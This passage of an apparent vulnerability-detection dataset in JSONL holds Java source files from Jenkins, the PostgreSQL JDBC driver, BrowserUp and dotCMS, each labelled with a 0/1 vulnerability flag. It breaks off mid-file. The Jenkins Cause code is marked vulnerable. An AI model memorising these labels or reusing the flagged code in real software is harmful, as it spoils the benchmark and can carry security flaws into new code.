1.505\n         */\n        public @CheckForNull Run<?,?> getUpstreamRun() {\n            Job<?,?> job = Jenkins.getInstance().getItemByFullName(upstreamProject, Job.class);\n            return job != null ? job.getBuildByNumber(upstreamBuild) : null;\n        }\n\n        @Exported(visibility=3)\n        public String getUpstreamUrl() {\n            return upstreamUrl;\n        }\n\n        public List<Cause> getUpstreamCauses() {\n            return upstreamCauses;\n        }\n        \n        @Override\n        public String getShortDescription() {\n            return Messages.Cause_UpstreamCause_ShortDescription(upstreamProject, upstreamBuild);\n        }\n\n        @Override\n        public void print(TaskListener listener) {\n            print(listener, 0);\n        }\n\n        private void indent(TaskListener listener, int depth) {\n            for (int i = 0; i < depth; i++) {\n                listener.getLogger().print(' ');\n            }\n        }\n\n        private void print(TaskListener listener, int depth) {\n            indent(listener, depth);\n            listener.getLogger().println(\n                Messages.Cause_UpstreamCause_ShortDescription(\n                    ModelHyperlinkNote.encodeTo('/' + upstreamUrl, upstreamProject),\n                    ModelHyperlinkNote.encodeTo('/'+upstreamUrl+upstreamBuild, Integer.toString(upstreamBuild)))\n            );\n            if (upstreamCauses != null && !upstreamCauses.isEmpty()) {\n                indent(listener, depth);\n                listener.getLogger().println(Messages.Cause_UpstreamCause_CausedBy());\n                for (Cause cause : upstreamCauses) {\n                    if (cause instanceof UpstreamCause) {\n                        ((UpstreamCause) cause).print(listener, depth + 1);\n                    } else {\n                        indent(listener, depth + 1);\n                        cause.print(listener);\n                    }\n                }\n            }\n        }\n\n        @Override public String toString() {\n            return upstreamUrl + upstreamBuild + upstreamCauses;\n        }\n\n        public static class ConverterImpl extends XStream2.PassthruConverter<UpstreamCause> {\n            public ConverterImpl(XStream2 xstream) { super(xstream); }\n            @Override protected void callback(UpstreamCause uc, UnmarshallingContext context) {\n                if (uc.upstreamCause != null) {\n                    if (uc.upstreamCauses == null) uc.upstreamCauses = new ArrayList<Cause>();\n                    uc.upstreamCauses.add(uc.upstreamCause);\n                    uc.upstreamCause = null;\n                    OldDataMonitor.report(context, \"1.288\");\n                }\n            }\n        }\n\n        public static class DeeplyNestedUpstreamCause extends Cause {\n            @Override public String getShortDescription() {\n                return \"(deeply nested causes)\";\n            }\n            @Override public String toString() {\n                return \"JENKINS-14814\";\n            }\n        }\n\n    }\n\n    /**\n     * A build is started by an user action.\n     *\n     * @deprecated 1.428\n     *   use {@link UserIdCause}\n     */\n    public static class UserCause extends Cause {\n        private String authenticationName;\n        public UserCause() {\n            this.authenticationName = Jenkins.getAuthentication().getName();\n        }\n\n        @Exported(visibility=3)\n        public String getUserName() {\n        \tUser u = User.get(authenticationName, false);\n            return u != null ? u.getDisplayName() : authenticationName;\n        }\n\n        @Override\n        public String getShortDescription() {\n            return Messages.Cause_UserCause_ShortDescription(authenticationName);\n        }\n\n        @Override\n        public boolean equals(Object o) {\n            return o instanceof UserCause && Arrays.equals(new Object[] {authenticationName},\n                    new Object[] {((UserCause)o).authenticationName});\n        }\n\n        @Override\n        public int hashCode() {\n            return 295 + (this.authenticationName != null ? this.authenticationName.hashCode() : 0);\n        }\n    }\n\n    /**\n     * A build is started by an user action.\n     *\n     * @since 1.427\n     */\n    public static class UserIdCause extends Cause {\n\n        private String userId;\n\n        public UserIdCause() {\n            User user = User.current();\n            this.userId = (user == null) ? null : user.getId();\n        }\n\n        @Exported(visibility = 3)\n        public String getUserId() {\n            return userId;\n        }\n\n        @Exported(visibility = 3)\n        public String getUserName() {\n            String userName = \"anonymous\";\n            if (userId != null) {\n                User user = User.get(userId, false);\n                if (user != null)\n                    userName = user.getDisplayName();\n            }\n            return userName;\n        }\n\n        @Override\n        public String getShortDescription() {\n            return Messages.Cause_UserIdCause_ShortDescription(getUserName());\n        }\n\n        @Override\n        public void print(TaskListener listener) {\n            listener.getLogger().println(Messages.Cause_UserIdCause_ShortDescription(\n                    ModelHyperlinkNote.encodeTo(\"/user/\"+getUserId(), getUserName())));\n        }\n\n        @Override\n        public boolean equals(Object o) {\n            return o instanceof UserIdCause && Arrays.equals(new Object[]{userId},\n                    new Object[]{((UserIdCause) o).userId});\n        }\n\n        @Override\n        public int hashCode() {\n            return 295 + (this.userId != null ? this.userId.hashCode() : 0);\n        }\n    }\n\n    public static class RemoteCause extends Cause {\n        private String addr;\n        private String note;\n\n        public RemoteCause(String host, String note) {\n            this.addr = host;\n            this.note = note;\n        }\n\n        @Override\n        public String getShortDescription() {\n            if(note != null) {\n                return Messages.Cause_RemoteCause_ShortDescriptionWithNote(addr, note);\n            } else {\n                return Messages.Cause_RemoteCause_ShortDescription(addr);\n            }\n        }\n\n        @Override\n        public boolean equals(Object o) {\n            return o instanceof RemoteCause && Arrays.equals(new Object[] {addr, note},\n                    new Object[] {((RemoteCause)o).addr, ((RemoteCause)o).note});\n        }\n\n        @Override\n        public int hashCode() {\n            int hash = 5;\n            hash = 83 * hash + (this.addr != null ? this.addr.hashCode() : 0);\n            hash = 83 * hash + (this.note != null ? this.note.hashCode() : 0);\n            return hash;\n        }\n    }\n}\n", "target": 1}
{"idx": 1060, "func": "/*\n * Copyright (c) 2003, PostgreSQL Global Development Group\n * See the LICENSE file in the project root for more information.\n */\n\npackage org.postgresql.core;\n\nimport org.postgresql.PGConnection;\nimport org.postgresql.PGProperty;\nimport org.postgresql.jdbc.FieldMetadata;\nimport org.postgresql.jdbc.TimestampUtils;\nimport org.postgresql.util.LruCache;\nimport org.postgresql.xml.PGXmlFactoryFactory;\n\nimport java.sql.Connection;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.util.TimerTask;\n\n/**\n * Driver-internal connection interface. Application code should not use this interface.\n */\npublic interface BaseConnection extends PGConnection, Connection {\n  /**\n   * Cancel the current query executing on this connection.\n   *\n   * @throws SQLException if something goes wrong.\n   */\n  void cancelQuery() throws SQLException;\n\n  /**\n   * Execute a SQL query that returns a single resultset. Never causes a new transaction to be\n   * started regardless of the autocommit setting.\n   *\n   * @param s the query to execute\n   * @return the (non-null) returned resultset\n   * @throws SQLException if something goes wrong.\n   */\n  ResultSet execSQLQuery(String s) throws SQLException;\n\n  ResultSet execSQLQuery(String s, int resultSetType, int resultSetConcurrency)\n      throws SQLException;\n\n  /**\n   * Execute a SQL query that does not return results. Never causes a new transaction to be started\n   * regardless of the autocommit setting.\n   *\n   * @param s the query to execute\n   * @throws SQLException if something goes wrong.\n   */\n  void execSQLUpdate(String s) throws SQLException;\n\n  /**\n   * Get the QueryExecutor implementation for this connection.\n   *\n   * @return the (non-null) executor\n   */\n  QueryExecutor getQueryExecutor();\n\n  /**\n   * Internal protocol for work with physical and logical replication. Physical replication available\n   * only since PostgreSQL version 9.1. Logical replication available only since PostgreSQL version 9.4.\n   *\n   * @return not null replication protocol\n   */\n  ReplicationProtocol getReplicationProtocol();\n\n  /**\n   * <p>Construct and return an appropriate object for the given type and value. This only considers\n   * the types registered via {@link org.postgresql.PGConnection#addDataType(String, Class)} and\n   * {@link org.postgresql.PGConnection#addDataType(String, String)}.</p>\n   *\n   * <p>If no class is registered as handling the given type, then a generic\n   * {@link org.postgresql.util.PGobject} instance is returned.</p>\n   *\n   * @param type the backend typename\n   * @param value the type-specific string representation of the value\n   * @param byteValue the type-specific binary representation of the value\n   * @return an appropriate object; never null.\n   * @throws SQLException if something goes wrong\n   */\n  Object getObject(String type, String value, byte[] byteValue) throws SQLException;\n\n  Encoding getEncoding() throws SQLException;\n\n  TypeInfo getTypeInfo();\n\n  /**\n   * <p>Check if we have at least a particular server version.</p>\n   *\n   * <p>The input version is of the form xxyyzz, matching a PostgreSQL version like xx.yy.zz. So 9.0.12\n   * is 90012.</p>\n   *\n   * @param ver the server version to check, of the form xxyyzz eg 90401\n   * @return true if the server version is at least \"ver\".\n   */\n  boolean haveMinimumServerVersion(int ver);\n\n  /**\n   * <p>Check if we have at least a particular server version.</p>\n   *\n   * <p>The input version is of the form xxyyzz, matching a PostgreSQL version like xx.yy.zz. So 9.0.12\n   * is 90012.</p>\n   *\n   * @param ver the server version to check\n   * @return true if the server version is at least \"ver\".\n   */\n  boolean haveMinimumServerVersion(Version ver);\n\n  /**\n   * Encode a string using the database's client_encoding (usually UTF8, but can vary on older\n   * server versions). This is used when constructing synthetic resultsets (for example, in metadata\n   * methods).\n   *\n   * @param str the string to encode\n   * @return an encoded representation of the string\n   * @throws SQLException if something goes wrong.\n   */\n  byte[] encodeString(String str) throws SQLException;\n\n  /**\n   * Escapes a string for use as string-literal within an SQL command. The method chooses the\n   * applicable escaping rules based on the value of {@link #getStandardConformingStrings()}.\n   *\n   * @param str a string value\n   * @return the escaped representation of the string\n   * @throws SQLException if the string contains a {@code \\0} character\n   */\n  String escapeString(String str) throws SQLException;\n\n  /**\n   * Returns whether the server treats string-literals according to the SQL standard or if it uses\n   * traditional PostgreSQL escaping rules. Versions up to 8.1 always treated backslashes as escape\n   * characters in string-literals. Since 8.2, this depends on the value of the\n   * {@code standard_conforming_strings} server variable.\n   *\n   * @return true if the server treats string literals according to the SQL standard\n   * @see QueryExecutor#getStandardConformingStrings()\n   */\n  boolean getStandardConformingStrings();\n\n  // Ew. Quick hack to give access to the connection-specific utils implementation.\n  TimestampUtils getTimestampUtils();\n\n  // Get the per-connection logger.\n  java.util.logging.Logger getLogger();\n\n  // Get the bind-string-as-varchar config flag\n  boolean getStringVarcharFlag();\n\n  /**\n   * Get the current transaction state of this connection.\n   *\n   * @return current transaction state of this connection\n   */\n  TransactionState getTransactionState();\n\n  /**\n   * Returns true if value for the given oid should be sent using binary transfer. False if value\n   * should be sent using text transfer.\n   *\n   * @param oid The oid to check.\n   * @return True for binary transfer, false for text transfer.\n   */\n  boolean binaryTransferSend(int oid);\n\n  /**\n   * Return whether to disable column name sanitation.\n   *\n   * @return true column sanitizer is disabled\n   */\n  boolean isColumnSanitiserDisabled();\n\n  /**\n   * Schedule a TimerTask for later execution. The task will be scheduled with the shared Timer for\n   * this connection.\n   *\n   * @param timerTask timer task to schedule\n   * @param milliSeconds delay in milliseconds\n   */\n  void addTimerTask(TimerTask timerTask, long milliSeconds);\n\n  /**\n   * Invoke purge() on the underlying shared Timer so that internal resources will be released.\n   */\n  void purgeTimerTasks();\n\n  /**\n   * Return metadata cache for given connection.\n   *\n   * @return metadata cache\n   */\n  LruCache<FieldMetadata.Key, FieldMetadata> getFieldMetadataCache();\n\n  CachedQuery createQuery(String sql, boolean escapeProcessing, boolean isParameterized,\n      String... columnNames)\n      throws SQLException;\n\n  /**\n   * By default, the connection resets statement cache in case deallocate all/discard all\n   * message is observed.\n   * This API allows to disable that feature for testing purposes.\n   *\n   * @param flushCacheOnDeallocate true if statement cache should be reset when \"deallocate/discard\" message observed\n   */\n  void setFlushCacheOnDeallocate(boolean flushCacheOnDeallocate);\n\n  /**\n   * Indicates if statements to backend should be hinted as read only.\n   *\n   * @return Indication if hints to backend (such as when transaction begins)\n   *         should be read only.\n   * @see PGProperty#READ_ONLY_MODE\n   */\n  boolean hintReadOnly();\n\n  /**\n   * Retrieve the factory to instantiate XML processing factories.\n   *\n   * @return The factory to use to instantiate XML processing factories\n   * @throws SQLException if the class cannot be found or instantiated.\n   */\n  PGXmlFactoryFactory getXmlFactoryFactory() throws SQLException;\n}\n", "target": 0}
{"idx": 1061, "func": "/*\n * The MIT License\n *\n * Copyright (c) 2011, CloudBees, Inc.\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage jenkins.security;\n\nimport hudson.Extension;\nimport hudson.Util;\nimport hudson.model.Descriptor.FormException;\nimport hudson.model.User;\nimport hudson.model.UserProperty;\nimport hudson.model.UserPropertyDescriptor;\nimport hudson.util.HttpResponses;\nimport hudson.util.Secret;\nimport jenkins.model.Jenkins;\nimport net.sf.json.JSONObject;\nimport org.kohsuke.stapler.AncestorInPath;\nimport org.kohsuke.stapler.DataBoundConstructor;\nimport org.kohsuke.stapler.HttpResponse;\nimport org.kohsuke.stapler.StaplerRequest;\nimport org.kohsuke.stapler.StaplerResponse;\n\nimport java.io.IOException;\nimport java.security.SecureRandom;\n\n/**\n * Remembers the API token for this user, that can be used like a password to login.\n *\n *\n * @author Kohsuke Kawaguchi\n * @see ApiTokenFilter\n * @since 1.426\n */\npublic class ApiTokenProperty extends UserProperty {\n    private volatile Secret apiToken;\n\n    @DataBoundConstructor\n    public ApiTokenProperty() {\n        _changeApiToken();\n    }\n\n    /**\n     * We don't let the external code set the API token,\n     * but for the initial value of the token we need to compute the seed by ourselves.\n     */\n    /*package*/ ApiTokenProperty(String seed) {\n        apiToken = Secret.fromString(seed);\n    }\n\n    public String getApiToken() {\n        String p = apiToken.getPlainText();\n        if (p.equals(Util.getDigestOf(Jenkins.getInstance().getSecretKey()+\":\"+user.getId()))) {\n            // if the current token is the initial value created by pre SECURITY-49 Jenkins, we can't use that.\n            // force using the newer value\n            apiToken = Secret.fromString(p=API_KEY_SEED.mac(user.getId()));\n        }\n        return Util.getDigestOf(p);\n    }\n\n    public boolean matchesPassword(String password) {\n        return getApiToken().equals(password);\n    }\n\n    public void changeApiToken() throws IOException {\n        _changeApiToken();\n        if (user!=null)\n            user.save();\n    }\n\n    private void _changeApiToken() {\n        byte[] random = new byte[16];   // 16x8=128bit worth of randomness, since we use md5 digest as the API token\n        RANDOM.nextBytes(random);\n        apiToken = Secret.fromString(Util.toHexString(random));\n    }\n\n    @Override\n    public UserProperty reconfigure(StaplerRequest req, JSONObject form) throws FormException {\n        return this;\n    }\n\n    @Extension\n    public static final class DescriptorImpl extends UserPropertyDescriptor {\n        public String getDisplayName() {\n            return Messages.ApiTokenProperty_DisplayName();\n        }\n\n        /**\n         * When we are creating a default {@link ApiTokenProperty} for User,\n         * we need to make sure it yields the same value for the same user,\n         * because there's no guarantee that the property is saved.\n         *\n         * But we also need to make sure that an attacker won't be able to guess\n         * the initial API token value. So we take the seed by hashing the secret + user ID.\n         */\n        public ApiTokenProperty newInstance(User user) {\n            return new ApiTokenProperty(API_KEY_SEED.mac(user.getId()));\n        }\n\n        public HttpResponse doChangeToken(@AncestorInPath User u, StaplerResponse rsp) throws IOException {\n            ApiTokenProperty p = u.getProperty(ApiTokenProperty.class);\n            if (p==null) {\n                p = newInstance(u);\n                u.addProperty(p);\n            } else {\n                p.changeApiToken();\n            }\n            rsp.setHeader(\"script\",\"document.getElementById('apiToken').value='\"+p.getApiToken()+\"'\");\n            return HttpResponses.html(Messages.ApiTokenProperty_ChangeToken_Success());\n        }\n    }\n\n    private static final SecureRandom RANDOM = new SecureRandom();\n\n    /**\n     * We don't want an API key that's too long, so cut the length to 16 (which produces 32-letter MAC code in hexdump)\n     */\n    private static final HMACConfidentialKey API_KEY_SEED = new HMACConfidentialKey(ApiTokenProperty.class,\"seed\",16);\n}\n", "target": 0}
{"idx": 1062, "func": "package com.browserup.bup.rest.validation.util;\n/*\n * Modifications Copyright (c) 2019 BrowserUp, Inc.\n * Original from:\n * https://github.com/hibernate/hibernate-validator/blob/master/engine/src/main/java/org/hibernate/validator/internal/engine/messageinterpolation/util/InterpolationHelper.java\n */\n/*\n * License: Apache License, Version 2.0\n * See the license file in the root directory or <http://www.apache.org/licenses/LICENSE-2.0>.\n */\n\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class MessageSanitizer {\n\n  public static final char BEGIN_CHAR = '{';\n  public static final char END_CHAR = '}';\n  public static final char EL_DESIGNATOR = '$';\n  public static final char ESCAPE_CHARACTER = '\\\\';\n\n  private static final Pattern ESCAPE_PATTERN = Pattern.compile( \"([\\\\\" + ESCAPE_CHARACTER + BEGIN_CHAR + END_CHAR + EL_DESIGNATOR + \"])\" );\n\n  private MessageSanitizer() {\n  }\n\n  public static String escape(String message) {\n    if ( message == null ) {\n      return null;\n    }\n    return ESCAPE_PATTERN.matcher( message ).replaceAll( Matcher.quoteReplacement( String.valueOf( ESCAPE_CHARACTER ) ) + \"$1\" );\n  }\n}\n", "target": 0}
{"idx": 1063, "func": "package com.dotmarketing.factories;\n\n//import com.dotmarketing.threads.DeliverNewsletterThread;\n\nimport java.io.BufferedOutputStream;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.StringWriter;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.LinkedHashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.Set;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\nimport com.dotcms.repackage.org.apache.commons.beanutils.BeanUtils;\n\nimport org.apache.velocity.Template;\nimport org.apache.velocity.context.Context;\nimport org.apache.velocity.exception.MethodInvocationException;\nimport org.apache.velocity.exception.ParseErrorException;\nimport org.apache.velocity.exception.ResourceNotFoundException;\n\nimport com.dotmarketing.beans.Host;\nimport com.dotmarketing.beans.Identifier;\nimport com.dotmarketing.beans.UserProxy;\nimport com.dotmarketing.business.APILocator;\nimport com.dotmarketing.cms.factories.PublicAddressFactory;\nimport com.dotmarketing.cms.factories.PublicCompanyFactory;\nimport com.dotmarketing.cms.factories.PublicEncryptionFactory;\nimport com.dotmarketing.db.HibernateUtil;\nimport com.dotmarketing.exception.DotDataException;\nimport com.dotmarketing.exception.DotHibernateException;\nimport com.dotmarketing.exception.DotRuntimeException;\nimport com.dotmarketing.exception.DotSecurityException;\nimport com.dotmarketing.exception.WebAssetException;\nimport com.dotmarketing.portlets.contentlet.business.HostAPI;\nimport com.dotmarketing.portlets.contentlet.model.Contentlet;\nimport com.dotmarketing.portlets.fileassets.business.FileAssetAPI;\nimport com.dotmarketing.portlets.files.business.FileAPI;\nimport com.dotmarketing.portlets.folders.model.Folder;\nimport com.dotmarketing.portlets.mailinglists.factories.MailingListFactory;\nimport com.dotmarketing.portlets.mailinglists.model.MailingList;\nimport com.dotmarketing.portlets.webforms.model.WebForm;\nimport com.dotmarketing.util.Config;\nimport com.dotmarketing.util.FormSpamFilter;\nimport com.dotmarketing.util.InodeUtils;\nimport com.dotmarketing.util.Logger;\nimport com.dotmarketing.util.Mailer;\nimport com.dotmarketing.util.Parameter;\nimport com.dotmarketing.util.UtilMethods;\nimport com.dotmarketing.util.VelocityUtil;\nimport com.liferay.portal.PortalException;\nimport com.liferay.portal.SystemException;\nimport com.liferay.portal.language.LanguageException;\nimport com.liferay.portal.language.LanguageUtil;\nimport com.liferay.portal.model.Address;\nimport com.liferay.portal.model.Company;\nimport com.liferay.portal.model.User;\nimport com.liferay.util.FileUtil;\n\n/**\n * DOCUMENT ME!\n * \n * @author $author$\n * @version $Revision: 1.10 $\n */\npublic class EmailFactory {\n\n\tprivate static Long emailTime = new Long(System.currentTimeMillis());\n\n\t/**\n\t * Rewrites urls to point back to the redirection servlet to track links\n\t * and then calls the alterBodyHtmlAbsolutizePaths method\n\t */\n\tpublic static StringBuffer alterBodyHTML(StringBuffer HTML, String serverName) {\n\t\treturn new StringBuffer(alterBodyHTML(HTML.toString(), serverName));\n\t}\n\n\tpublic static String alterBodyHTML(String HTML, String serverName) {\n\t\t//This is the new Regular Expression for white spaces ([ .\\r\\n&&[^>]]*)\n\t\t// Replacing links \"a href\" like tags axcluding the mail to links\n\n\t\tHTML = HTML.replaceAll(\"(?i)(?s)<a[^>]+href=\\\"([^/(http://)(https://)(#)(mailto:\\\")])(.*)\\\"[^>]*>\",\n\t\t\"<a href=\\\"http://$1$2\\\">\");\n\n\t\tHTML = HTML.replaceAll(\n\t\t\t\t//\"(?i)(?s)<a[^>]+href=\\\"([^>]+)\\\"[^>]*>(.*?)</[^>]*a[^>]*>\",\n\t\t\t\t\"(?i)(?s)<a href=\\\"([^#])([^>]+)\\\"[^>]*>(.*?)</[^>]*a[^>]*>\",\n\t\t\t\t\"<a href=\\\"http://\"\n\t\t\t\t+ serverName\n\t\t\t\t//+ \"/redirect?r=<rId>&redir=$1\\\">$2</a>\")\n\t\t\t\t+ \"/redirect?r=<rId>&redir=$1$2\\\">$3</a>\")\n\t\t\t\t.replaceAll(\"<a href=\\\"http://\" + serverName + \"/redirect\\\\?r=<rId>&redir=(mailto:[^\\\"]+)\\\">\", \"<a href=\\\"$1\\\">\");\n\t\tHTML = alterBodyHtmlAbsolutizePaths(HTML, serverName);\n\t\treturn HTML;\n\t}\n\n\t/**\n\t * Change all the relative paths in the email body to absolute paths\n\t */\n\tpublic static StringBuffer alterBodyHtmlAbsolutizePaths(StringBuffer HTML, String serverName)\n\t{\n\t\treturn new StringBuffer(alterBodyHtmlAbsolutizePaths(HTML.toString(), serverName));\n\t}\n\n\tpublic static String alterBodyHtmlAbsolutizePaths(String HTML, String serverName)\n\t{\n\t\tString message = HTML;\n\n\t\t//Replacing links \"TD background\" like tags\n\t\tmessage = message\n\t\t.replaceAll(\n\t\t\t\t\"<\\\\s*td([^>]*)background\\\\s*=\\\\s*[\\\"\\']?([^\\'\\\">]*)[\\\"\\']?([^>]*)>\",\n\t\t\t\t\"<td$1background=\\\"http://\"\n\t\t\t\t+ serverName\n\t\t\t\t+ \"$2\\\"$3>\");\n\t\t// Replacing links \"TR background\" like tags\n\t\tmessage = message\n\t\t.replaceAll(\n\t\t\t\t\"<\\\\s*tr([^>]*)background\\\\s*=\\\\s*[\\\"\\']?([^\\'\\\">]*)[\\\"\\']?([^>]*)>\",\n\t\t\t\t\"<tr$1background=\\\"http://\"\n\t\t\t\t+ serverName\n\t\t\t\t+ \"$2\\\"$3>\");\n\t\t// Replacing links \"IMG SRC\" like tags\n\t\tmessage = message.replaceAll(\n\t\t\t\t\"<\\\\s*img([^>]*)src\\\\s*=\\\\s*[\\\"\\']?([^\\'\\\">]*)[\\\"\\']?([^>]*)>\",\n\t\t\t\t\"<img$1src=\\\"http://\" + serverName\n\t\t\t\t+ \"$2\\\"$3>\");\n\t\t// Replacing links \"A HREF\" like tags\n\t\tmessage = message\n\t\t.replaceAll(\n\t\t\t\t\"<\\\\s*link([^>]*)href\\\\s*=\\\\s*[\\\"\\']?([^\\'\\\">]*)[\\\"\\']?([^>]*)>\",\n\t\t\t\t\"<link$1href=\\\"http://\"\n\t\t\t\t+ serverName\n\t\t\t\t+ \"$2\\\"$3>\");\n\t\t// Replacing links \"SCRIPT\" like tags\n\t\tmessage = message\n\t\t.replaceAll(\n\t\t\t\t\"<\\\\s*script([^>]*)src\\\\s*=\\\\s*[\\\"\\']?([^\\'\\\">]*)[\\\"\\']?([^>]*)>\",\n\t\t\t\t\"<script$1src=\\\"http://\"\n\t\t\t\t+ serverName\n\t\t\t\t+ \"$2\\\"$3>\");\n\t\t// Replacing links \"APPLET\" with codebase like tags\n\t\tmessage = message\n\t\t.replaceAll(\n\t\t\t\t\"<\\\\s*applet([^>]*)codebase\\\\s*=\\\\s*[\\\"\\']?([^\\'\\\">]*)[\\\"\\']?([^>]*)>\",\n\t\t\t\t\"<applet$1codebase=\\\"http://\"\n\t\t\t\t+ serverName\n\t\t\t\t+ \"$2\\\"$3>\");\n\t\t// Replacing links \"APPLET\" without codebase like tags\n\t\tmessage = message\n\t\t.replaceAll(\n\t\t\t\t\"<\\\\s*applet(([^>][^(codebase)])*)code\\\\s*=\\\\s*[\\\"\\']?([^\\'\\\">]*)[\\\"\\']?(([^>][^(codebase)])*)>\",\n\t\t\t\t\"<applet$1code=\\\"http://\"\n\t\t\t\t+ serverName\n\t\t\t\t+ \"$4\\\"$5>\");\n\t\t// Replacing links \"IFRAME\" src replacement\n\t\tmessage = message\n\t\t.replaceAll(\n\t\t\t\t\"<\\\\s*iframe([^>]*)src\\\\s*=\\\\s*[\\\"\\']?([^\\'\\\">]*)[\\\"\\']?([^>]*)>\",\n\t\t\t\t\"<iframe$1src=\\\"http://\"\n\t\t\t\t+ serverName\n\t\t\t\t+ \"$2\\\"$3>\");\n\t\t// Replacing links \"IFRAME\" longdesc replacement\n\t\tmessage = message\n\t\t.replaceAll(\n\t\t\t\t\"<\\\\s*iframe([^>]*)longdesc\\\\s*=\\\\s*[\\\"\\']?([^\\'\\\">]*)[\\\"\\']?([^>]*)>\",\n\t\t\t\t\"<iframe$1longdesc=\\\"http://\"\n\t\t\t\t+ serverName\n\t\t\t\t+ \"$2\\\"$3>\");\n\t\t// Replacing links \"FRAME\" src replacement\n\t\tmessage = message\n\t\t.replaceAll(\n\t\t\t\t\"<\\\\s*frame([^>]*)src\\\\s*=\\\\s*[\\\"\\']?([^\\'\\\">]*)[\\\"\\']?([^>]*)>\",\n\t\t\t\t\"<frame$1src=\\\"http://\"\n\t\t\t\t+ serverName\n\t\t\t\t+ \"$2\\\"$3>\");\n\t\t// Replacing links \"FRAME\" longdesc replacement\n\t\tmessage = message\n\t\t.replaceAll(\n\t\t\t\t\"<\\\\s*frame([^>]*)longdesc\\\\s*=\\\\s*[\\\"\\']?([^\\'\\\">]*)[\\\"\\']?([^>]*)>\",\n\t\t\t\t\"<frame$1longdesc=\\\"http://\"\n\t\t\t\t+ serverName\n\t\t\t\t+ \"$2\\\"$3>\");\n\t\t// Replacing some style URLs\n\t\tmessage = message\n\t\t.replaceAll(\n\t\t\t\t\"<([^>]*)style\\\\s*=\\\\s*[\\\"\\']?([^\\'\\\">]*)url\\\\s*\\\\(\\\\s*([^>]*)\\\\s*\\\\)([^\\'\\\">]*)[\\\"\\']?([^>]*)>\",\n\t\t\t\t\"<$1style=\\\"$2url(http://\"\n\t\t\t\t+ serverName\n\t\t\t\t+ \"$3)$4\\\"$5>\");\n\t\t// Fixing absolute paths\n\t\tmessage = message.replaceAll(\"http://\"\n\t\t\t\t+ serverName + \"\\\\s*http://\",\n\t\t\"http://\");\n\n\t\treturn message;\n\t}\n\n\t/**\n\t * Sends the forgot password email with the new random generated password\n\t * @throws DotSecurityException \n\t * @throws DotDataException \n\t */\n\tpublic static boolean sendForgotPassword(User user, String newPassword, String hostId) throws DotDataException, DotSecurityException {\n\n\t\tHostAPI hostAPI = APILocator.getHostAPI();\n\n\t\t// build a decent default context\n\t\tContext context = VelocityUtil.getBasicContext();\n\t\tcontext.put(\"user\", user);\n\t\tcontext.put(\"UtilMethods\", new UtilMethods());\n\t\tcontext.put(\"language\", Long.toString(APILocator.getLanguageAPI().getDefaultLanguage().getId()));\n\t\tcontext.put(\"password\", newPassword);\n\n\t\tHost host = hostAPI.find(hostId, user, true);\n\t\tcontext.put(\"host\", host);\n\n\t\tStringWriter writer = new StringWriter();\n\n\t\tString idInode = APILocator.getIdentifierAPI().find(host, Config\n\t\t\t\t.getStringProperty(\"PATH_FORGOT_PASSWORD_EMAIL\")).getInode();\n\t\t\n\t\tString languageStr = \"_\" + APILocator.getLanguageAPI().getDefaultLanguage().getId();\n\n\t\ttry {\n\t\t\tString message = \"\";\n\t\t\ttry {\n\t\t\t\tTemplate t = UtilMethods.getVelocityTemplate(\"live/\"+ idInode+ languageStr + \".\"+ Config.getStringProperty(\"VELOCITY_HTMLPAGE_EXTENSION\")); \n\t\t\t\tt.merge(context, writer);\n\t\t\t\tLogger\n\t\t\t\t.debug(EmailFactory.class, \"writer:\"\n\t\t\t\t\t\t+ writer.getBuffer());\n\t\t\t\tmessage = writer.toString().trim();\n\t\t\t} catch (ResourceNotFoundException ex) {\n\t\t\t\tmessage = \"<center><b>And error has ocurred loading de message's page<b></center>\";\n\t\t\t}\n\n\t\t\tMailer m = new Mailer();\n\t\t\tm.setToEmail(user.getEmailAddress());\n\t\t\tm.setSubject(\"Your \" + host.getHostname() + \" Password\");\n\t\t\tm.setHTMLBody(message);\n\t\t\tm.setFromEmail(Config.getStringProperty(\"EMAIL_SYSTEM_ADDRESS\"));\n\t\t\treturn m.sendMessage();\n\t\t} catch (Exception e) {\n\t\t\tLogger.warn(EmailFactory.class, e.toString(), e);\n\t\t\treturn false;\n\t\t}\n\n\t}\n\n\tpublic static boolean isSubscribed(MailingList list, User s){\n\n\t\tUserProxy up;\n\t\ttry {\n\t\t\tup = com.dotmarketing.business.APILocator.getUserProxyAPI().getUserProxy(s,APILocator.getUserAPI().getSystemUser(), false);\n\t\t} catch (Exception e) {\n\t\t\tLogger.error(EmailFactory.class, e.getMessage(), e);\n\t\t\tthrow new DotRuntimeException(e.getMessage(), e);\n\t\t}\t\n\t\treturn MailingListFactory.isSubscribed(list, up);\n\n\t}\n\n\t/**\n\t * \n\t * Send emails based on the parameters given to the method, basically is used\n\t * to send emails based on parameters received html forms but it can be used \n\t * to send emails using parameters that come form any source\n\t * \n\t * Some parameters are required and need to be passed in order the method to work \n\t * correctly, here it is the description of the predefined parameters and when they are \n\t * required or not:\n\t * \n\t * formType/formName: \tThe name of the form used to generate the reports and to save the files submitted \n\t * \t\t\t\t\t\tas parameters, so if no formType or formName is supplied then no report\n\t * \t\t\t\t\t\tor files will be saved.\n\t * to:\t\t\t\t\tEmail address where the email will be sent\n\t * from:\t\t\t\tEmail address will be used as the from 